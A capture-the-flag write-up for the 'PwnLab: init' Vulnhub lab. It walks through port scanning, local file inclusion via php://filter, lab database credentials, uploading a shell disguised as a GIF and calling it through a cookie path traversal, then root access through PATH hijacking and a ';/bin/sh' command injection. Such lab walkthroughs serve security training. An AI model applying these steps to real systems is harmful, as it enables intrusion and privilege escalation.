<h1>PwnLab: init Write-up</h1>

<h2>Nmap</h2>

```
PORT      STATE SERVICE VERSION  
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))  
111/tcp   open  rpcbind 2-4 (RPC #100000)  
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1  
49623/tcp open  status  1 (RPC #100024)
```

<h3>PORT 80</h3>

**LFI:**

```
http://192.168.56.33/?page=php://filter/convert.base64-encode/resource=index
http://192.168.56.33/?page=php://filter/convert.base64-encode/resource=upload
http://192.168.56.33/?page=php://filter/convert.base64-encode/resource=config

Decode Base64 to get the orignal file 
```

From config file got password using that connect to mysql 

```
mysql -h 192.168.56.33 -u root -p Users  -p
password  : H4u%QJ_H99

kent - Sld6WHVCSkpOeQ== 
mike - U0lmZHNURW42SQ==
kane - aVN2NVltMkdSbw== 

decode base64

user :kent 
pass :JWzXuBJJNy

user :mike
pass :SIfdsTEn6I

user :kane
pass :iSv5Ym2GRo
```


<h3>LFI to Shell :</h3>

* Upload shell 

```
GIF89a;

PASTE YOUR PHP SHELL CODE HERE
```
Save this file as shell.gif and then upload:

Check source code to see the filename and Location

* In the index.php php code i saw there is **lang** cookie using that we can call our shell ;)

Visit http://MACHINEIP and turn your burp intercept on

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/PwnLab%3A%20init/Images/burp.png)

add **lang=../../SHELLLOCATION** in cookie section 

Forward the request to get the shell (start listner before forwarding req)

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/PwnLab%3A%20init/Images/shell.png)

<h2>Privilege Escalation</h2>

Switch to **kane**, Found password earlier in mysql

In the home directory of kane there is binary file named **msgmike**

Exploting **msgmike**

On Analysing msgmike i found:

```
int main()  
{  
      system("cat /home/mike/msg.txt");  
}  
```

Its executing cat 

Steps :

1) in home directory  echo "/bin/bash" > cat 

2) chmod +x cat

3) PATH=/home/kane

4) ./msgmike

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/PwnLab%3A%20init/Images/PRIV1.png)

<h2>Privilege Escalation (root):</h2>

```
cd /home/mike
./msg2root
;/bin/sh
```

![alt text](https://raw.githubusercontent.com/Vanshal/Vulnhub-Writeups/master/PwnLab%3A%20init/Images/flag.png)

